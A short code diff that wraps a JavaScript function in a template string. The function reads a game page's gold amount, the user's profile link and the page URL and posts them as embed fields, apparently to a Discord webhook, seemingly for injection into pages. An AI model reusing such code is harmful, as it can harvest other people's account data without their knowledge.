@@ -1,4 +1,4 @@
-function(e){    
+`(function(e){    
     let gold=t.document.getElementsByClassName('data')[0].innerHTML;
     let profile=t.document.querySelectorAll('#react-topbar-avatar[href]')[0].href;
     let name=t.location.href;
@@ -20,4 +20,4 @@ function(e){
             "fields":[{"name":"User Profile","value":"${profile}","inline":true},{"name":"User Gold Amount","value":"${gold}","inline":true},{"name":"C.E.T.","value":"${time}","inline":true},{"name":"Game Link","value":"${name}","inline":true}]
             }]}`
     });
-};
+};)`
